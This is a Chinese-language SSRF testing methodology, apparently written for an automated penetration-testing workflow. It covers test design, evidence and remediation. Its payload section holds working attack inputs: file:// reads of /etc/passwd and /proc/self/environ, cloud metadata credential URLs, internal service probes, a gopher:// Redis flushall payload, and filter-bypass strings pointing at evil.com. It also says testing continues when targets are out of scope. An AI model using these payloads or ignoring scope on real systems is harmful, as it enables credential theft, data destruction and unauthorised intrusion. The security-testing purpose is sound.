# SSRF服务端请求伪造测试方法论

## 编排适配

先读 [运行边界与证据口径](../../references/security-boundaries.md)。在分配的节点、预算和低影响约束内执行；`scope_policy` 只做资产归因，新发现的目标记录来源即可，不因 `in_scope=false` 停止；证据保留观察到的原始值，报告与委派只取证明问题所需的最小片段。

- 适用场景：发现 URL 代取、图片/文件远程加载、Webhook、回调、导入、预览、OAuth、报表生成或服务端请求外部地址的功能。
- 触发信号：`url_fetch_parameter_detected`、`webhook_url_field_detected`、`remote_image_import_detected`、`callback_url_detected`、`ssrf_candidate_detected`、`file_preview_remote_url_detected`。
- 测试前置环境：通常需要有服务端发起请求的功能和测试用的回连监听/测试地址；内网/云元数据验证建议使用客户允许的安全目标。
- 参考工件：`request_corpus`、`forms/actions`、`oob_listener_logs`、`api_inventory`。
- 解锁输出：`ssrf_validated`、`internal_network_leakage_candidate`、`cloud_metadata_exposure_candidate`、`vulnerability_chain_input`。
- 建议阻断（可低影响补齐时先补证再测）：无 URL/回调输入、无法提供受控监听地址、验证会访问内网真实资源。

## 适用场景

- 在存在“服务端代为请求外部资源”的功能时使用本方法论，包括图片加载、文件预览、报表导出、附件转码、远程抓取、分享预览、头像同步、回调测试等入口。
- 在请求参数、表单字段、JSON 字段或后端配置中出现 `url`、`uri`、`path`、`file`、`img`、`pdf`、`link`、`callback`、`endpoint`、`redirect` 等可疑键名时优先怀疑 SSRF。
- 在功能表现为“前端提交一个位置，后端返回文件、图片、页面片段或解析结果”时，应优先判断是否存在服务端代取行为，而不是只从前端直连思路分析。
- 在错误信息、超时差异、内容类型异常、状态码变化、重定向跟随、返回体透传等现象出现时，应将其视为 SSRF 的强信号。
- 在测试中需要验证“是否可由应用服务器访问不应由当前功能访问的位置”时使用本方法论；所有验证都限定为低影响、最小化、可回滚、可解释。

## 测试思想

- 先确认“这是后端在请求”，再确认“后端能请求到哪里”，最后确认“请求结果是否被利用或暴露”。不要一开始就把重点放在内网探测范围扩张上。
- 把 SSRF 判断拆成四层：是否存在可控目标、是否发生服务端请求、是否存在访问边界缺失、是否形成可证明影响。
- 优先使用对照组验证，而不是依赖单一成功样本。对照组至少包含：合法业务地址、不可达地址、受控可观测地址、格式非法地址。
- 优先使用最小化证据证明“服务端发生了请求”或“服务端泄露了响应差异”，避免为了证明可利用性而进行高噪声探测。
- 将“可访问任意地址”和“只能访问有限白名单但校验不严”区分开写。前者偏设计缺陷，后者常见于白名单、重定向、域名解析或协议处理不完整。
- 影响判断不要只看能否访问内网主机，还要看是否可读取响应正文、是否可探测端口状态、是否可跟随跳转、是否可访问云元数据或运维接口、是否能被业务链路稳定触发。

## 参考方法（目标与常见路径，不是必须顺序）

下面是达成测试目标的常见路径，不是必须照做的脚本：可以合并步骤、调整顺序、跳过已经确认过的部分，或者换成你判断更合适的方法，只要仍能支撑下面的判断点和证据要求。

1. 信息收集
- 标记所有会让后端获取远程资源的接口、页面和异步请求。
- 记录认证前后是否都可到达，确认入口是否依赖登录态、业务角色或特定流程。
- 识别参数进入点：查询参数、POST 字段、JSON 字段、富文本内容、导入文件中的链接字段、服务端配置项。
- 判断返回模式：原样转发、解析后返回、下载后转码、仅返回成功失败、异步任务执行。

2. 构造对照组
- 准备一个正常业务可接受的资源位置，确认功能本身可用，避免把功能故障误判为防护。
- 准备一个语法正确但不可达的位置，观察超时、报错、状态码、页面提示是否发生变化。
- 准备一个受控观测位置，只验证是否收到请求、请求方法、请求头特征和来源时间，不返回大体积内容。
- 准备一个格式错误或协议不符合预期的位置，用于判断服务端校验发生在请求前还是请求后。

3. 最小化验证
- 先验证是否产生服务端外连，可通过受控观测位置收到请求这一事实建立 SSRF 证据。
- 若业务会直接返回响应内容，仅取最小、无敏感、静态的响应片段证明代取成立，避免抓取真实业务数据。
- 若业务不回显正文，则通过状态差异、响应时间、错误类型、内容类型变化来证明后端请求行为。
- 若怀疑仅允许特定域名，测试是否存在重定向绕过、二次解析差异、大小写或编码差异导致的校验缺口，但只记录校验逻辑缺陷，不做越界扩展。

4. 影响面确认
- 判断目标是否只能访问外网受限资源，还是能够触达内网地址、管理平面、对象存储、监控接口或本地回环地址。
- 判断是否支持多协议、非默认端口、自动跟随重定向、POST 转 GET、Header 透传、认证信息透传。
- 判断响应内容是否被原样返回、部分截断、按文件类型处理，或仅在服务端消费但不回显。
- 判断该能力是单接口缺陷，还是多个预览、导出、转码、同步功能共享同一后端取数组件。

5. 留证与收口
- 固定最少请求数量，保留一组合法、一组不可达、一组受控观测的对照证据即可，不重复扫描。
- 记录测试时间、账号角色、请求入口、参数位置、关键差异和受控观测记录。
- 在能够证明风险后立即停止，不继续枚举更多地址、端口或内部资产。

## 漏洞确认与 Payload 技法

本节提供具体的验证手段和 payload 模板，适用于在"怀疑存在 SSRF"之后，选用最小代价方式将其坐实。按验证目的分类使用，不要在单次测试中堆叠所有方法。

### 带外 DNS 验证（DNSlog / OAST）

**适用场景**：服务端发起请求但无任何正文回显，或怀疑存在盲 SSRF。

**原理**：在可控参数中注入指向自有 DNS 子域的地址，若服务端发起请求，DNS 服务器会收到解析记录，从而在不依赖 HTTP 响应的情况下确认外连行为。

**常用平台**（优先使用测试专用或自建实例）：
- `interact.sh` / `interactsh`（开源自建，推荐测试环境自部署）
- `dnslog.cn`（公共，仅限无敏感数据场景）
- `ceye.io`（公共，带 HTTP 日志）
- Burp Collaborator（需要 Burp Suite Pro）

**Payload 示例**：
```
# HTTP 触发 DNS 解析
http://<unique-id>.dnslog.cn/test

# 嵌入业务参数
?url=http://ssrftest.<unique-id>.oast.fun/img.png
{"callback": "http://ssrftest.<unique-id>.interact.sh/cb"}

# 带路径区分多个入口来源
http://api-login.<unique-id>.dnslog.cn/
http://export-pdf.<unique-id>.dnslog.cn/
```

**证据采集**：记录 DNS 解析日志中的时间戳、来源 IP、查询域名，作为服务端外连的直接证据。若同时收到 DNS + HTTP 请求，可进一步确认协议栈。

**注意**：公共 DNSlog 平台上的子域请求记录对所有人可见，不要在 payload 中嵌入目标系统信息，仅用作触发确认，不传递任何业务内容。

### file:// 协议读取本地文件

**适用场景**：服务端未限制协议时，使用 `file://` 直接读取服务器本地文件以证明任意协议支持。

**Linux 推荐目标文件**（从低敏感到高敏感排列，优先选靠前的）：

| 文件路径 | 内容说明 | 建议优先级 |
|---|---|---|
| `/etc/hostname` | 服务器主机名，单行，无敏感数据 | ⭐⭐⭐ 首选 |
| `/etc/issue` | 操作系统发行版信息 | ⭐⭐⭐ |
| `/proc/version` | 内核版本信息 | ⭐⭐⭐ |
| `/etc/passwd` | 用户列表（无密码），证明文件读取能力 | ⭐⭐ |
| `/etc/hosts` | 本地 DNS 配置，可辅助内网信息 | ⭐⭐ |
| `/proc/self/environ` | 当前进程环境变量，可能含密钥 | ⭐ 谨慎，仅需证明影响面时使用 |
| `/proc/net/tcp` | 本地监听端口，辅助内网探测 | ⭐ 谨慎 |

**Windows 推荐目标文件**：

| 文件路径 | 内容说明 |
|---|---|
| `C:\Windows\win.ini` | 基础 Windows 配置，始终存在 |
| `C:\Windows\System32\drivers\etc\hosts` | Hosts 文件 |
| `C:\boot.ini` | 引导配置（XP/2003 时代系统）|

**Payload 示例**：
```
# 标准形式
file:///etc/hostname
file:///etc/passwd

# 加 localhost
file://localhost/etc/hostname

# Windows
file:///C:/Windows/win.ini
file:///C:/Windows/System32/drivers/etc/hosts

# URL 编码变体（用于绕过简单字符串过滤）
file:///etc/%70asswd
```

**注意**：读取到 `/etc/hostname` 或 `/proc/version` 即可确认 file:// 支持，不需要继续读取含密钥的文件；截取最少必要行数作为证据，不保留完整敏感文件内容。

### 云平台元数据接口探测

**适用场景**：目标部署在云环境，服务端存在 SSRF 时可尝试访问实例元数据，这是 SSRF 危害升级的核心路径之一。

**各云厂商元数据地址**：

```
# AWS（IMDSv1，无需令牌，危险）
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# AWS（IMDSv2，需先获取 Token，相对受限）
# 第一步：PUT 请求获取 Token（SSRF 通常只支持 GET，IMDSv2 有一定防护）

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# 需带 Header: Metadata: true（SSRF 可能无法自定义 Header，记录此限制）

# GCP（Google Cloud）
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
# 需带 Header: Metadata-Flavor: Google

# 阿里云
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/

# 腾讯云
http://metadata.tencentyun.com/latest/meta-data/
```

**证据要求**：收到包含 `instance-id`、`ami-id`、`hostname` 或临时凭证字段的响应，即可确认元数据可达，升级为高风险。不要继续提取 IAM 凭证的完整值，截取字段名称存在即可。

### HTTP/HTTPS 探测内网与管理接口

**适用场景**：服务端支持 http/https 协议，需确认内网访问能力边界。

**常见高价值内网目标类型**（只做可达性判断，不登录、不操作）：

```
# 本地回环
http://127.0.0.1/
http://127.0.0.1:8080/
http://localhost/

# 常见内网管理服务（判断端口开放 / 服务识别）
http://192.168.x.x:2375/         # Docker Remote API（未授权高危）
http://192.168.x.x:6379/         # Redis（SSRF + gopher 可进一步利用）
http://192.168.x.x:8161/         # ActiveMQ 管理界面
http://192.168.x.x:9200/         # Elasticsearch
http://192.168.x.x:8500/         # Consul
http://192.168.x.x:4848/         # GlassFish 管理
http://192.168.x.x:7001/         # WebLogic

# Spring Boot Actuator（内网运维接口）
http://127.0.0.1:8080/actuator/
http://127.0.0.1:8080/actuator/env
http://127.0.0.1:8080/actuator/health
```

**端口探测通过响应差异判断**：开放端口通常立即响应（快速返回或有正文），关闭端口通常连接被拒（Connection refused 错误），过滤端口通常超时。这三种差异稳定出现即可作为端口状态证据。

### 其他协议（高级场景，谨慎使用）

仅在有明确利用目标且业务场景合理时使用。

**dict://**（用于探测 Redis、Memcached 等明文 TCP 服务）：
```
dict://127.0.0.1:6379/info
dict://127.0.0.1:11211/stats
```

**gopher://**（可构造任意 TCP 流量，高危，谨慎）：
```
# Redis 未授权写入示例（仅了解，在隔离环境验证）
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
```

gopher:// 可被用于 SSRF + RCE 组合利用，如 Redis 写 Cron 或 Webshell，因此在报告中提及这一潜在路径时，只需说明"该入口支持 gopher 协议，存在进一步组合利用风险"，不要在实际测试中完整演示利用链。

### IP 地址与 URL 绕过技法

当存在简单的字符串黑名单校验时，以下变体用于探测校验逻辑是否完整。每种变体测一次确认校验边界即可，不需要全部枚举。

**127.0.0.1 的等价表达**：
```
http://127.1/                    # 简写
http://127.0.1/                  # 简写
http://2130706433/               # 十进制
http://0x7f000001/               # 十六进制
http://0177.0.0.1/               # 八进制
http://[::1]/                    # IPv6 回环
http://[::ffff:127.0.0.1]/       # IPv6 映射 IPv4
http://0:0:0:0:0:ffff:7f00:1/    # 完整 IPv6
http://127.0.0.1.nip.io/        # DNS 解析到 127.0.0.1 的服务
```

**URL 解析混淆**（绕过只校验前缀或 Host 字段的逻辑）：
```
http://trusted.com@evil.com/path        # @ 符号混淆
http://trusted.com.evil.com/            # 前缀欺骗
http://evil.com/trusted.com/            # 路径混淆
http://trusted.com%00.evil.com/         # 空字节截断
https://trusted.com#.evil.com/          # Fragment 混淆
http://trusted.com\.evil.com/           # 反斜线
```

**重定向绕过**（当服务端跟随跳转且只校验初始 URL 时）：
- 在受控服务器上放置一个 302 跳转到目标地址，提交受控地址
- 若服务端在校验初始 URL 后跟随跳转，则绕过了域名白名单
- 记录为"跳转后目标校验缺失"，属于白名单逻辑不完整，而非完全无校验

## 关键判断点

- 入口是否由用户完全控制目标地址，还是仅控制路径片段、查询串或文件名；后者仍可能通过拼接进入 SSRF。
- 服务端是否在发起请求前做了协议、域名、端口、地址类型校验；若校验只做了字符串匹配，通常不可靠。
- 校验对象是原始输入、解析后的主机、DNS 解析结果还是最终跳转目标；不同层次对应不同绕过面。
- 是否存在“功能上看似导出文件，实质上由后端请求指定链接后再回传”的代理下载模式，这是本组样本中的高频入口。
- 是否存在通过 PDF、图片、报告或预览接口读取到不符合业务预期的内容类型或内容结构，这通常说明后端请求目标未被约束。
- 是否出现不同目标带来的稳定差异，例如成功、超时、拒绝、格式错误、回显片段不同；稳定差异比单次异常更能支撑结论。
- 若只观察到报错而没有外连证据，应谨慎定性；优先补足受控观测或更明确的响应差异，再判断是否为真实 SSRF。
- 若只能访问固定白名单资源，但白名单中的跳转目标未受控，应按“白名单绕过风险”描述，不要夸大成完全任意 SSRF。

## 证据链要求

- 至少保留一条触发请求的原始请求样本，明确入口路径、参数名、认证态和提交方式。
- 至少保留一组对照：正常业务输入与受控验证输入的响应差异，或不可达输入与受控验证输入的差异。
- 若使用受控观测位置，记录接收时间、请求方法、请求路径、关键请求头或访问日志摘要，避免保存敏感正文。
- 若使用页面回显证明，截取最小必要片段即可，证明“内容来自目标位置且不符合当前业务预期”即可，不保留真实敏感内容。
- 若判断可触达内网或管理接口，证据以“可访问到某类非预期资源”即可，不需要继续扩大探测范围。
- 若判断多个接口共用同一缺陷，保留一个主证据接口和一个旁证接口，说明是共享组件或相同处理逻辑导致。
- 证据描述中必须包含测试前提：测试账号角色、低影响原则、未进行破坏性操作。

## 风险定级思路

- 高风险：可由稳定入口访问非预期内部资源或敏感管理接口，且存在正文回显、明确的端口探测能力、运维面暴露或可被低权限角色稳定触发。
- 中风险：可确认存在服务端外连与边界缺失，但影响面受限，例如仅支持部分协议、仅能访问少量地址、只暴露状态差异而不回显正文。
- 低风险：仅存在可疑代取行为或弱校验现象，但缺少稳定证据证明可访问非预期位置，或必须依赖严格前置条件且业务可利用性弱。
- 降级因素：需要高权限、仅在受限内网管理场景出现、无法稳定复现、仅一次性异常且缺少对照支撑。
- 升级因素：入口匿名可达、多个业务功能共用、支持重定向链、支持任意端口、可访问云环境元数据类资源、修复成本高且暴露面广。
- 定级时单独说明“能力边界”与“业务暴露面”，避免只因为出现内网字样就机械定高危。

## 修复与复测

- 修复优先级从高到低通常是：去掉不必要的服务端代取能力、改为后端固定资源映射、建立严格白名单、解析后校验最终目标、限制协议和端口、禁止自动跳转、统一错误返回、收敛响应正文。
- 白名单校验应基于规范化后的最终目标进行，不要只校验输入字符串；复测时重点检查大小写、编码、跳转和别名目标是否还能绕过。
- 地址校验应区分公网地址、私有地址、本地回环、链路本地、保留地址和名称解析后的最终落点；复测时确认这些边界都已阻断。
- 若业务必须下载远程文件，应增加内容类型、大小、超时、重试、响应截断和审计日志控制；复测时确认即使代取成功也不会把不符合业务的内容直接返回前端。
- 若多个功能共用同一取数组件，复测不能只测主入口；应抽查至少一个图片类入口、一个导出类入口或一个预览类入口，确认修复是组件级生效。
- 复测顺序应为：合法业务资源仍可用、受控观测输入不再产生请求、不可达输入不再暴露差异、重定向与编码变体不再绕过、错误信息已统一。
- 若修复方案是仅增加前端校验或仅屏蔽单一路径，应在报告中标明为不充分修复，并要求回到后端请求链路做控制。
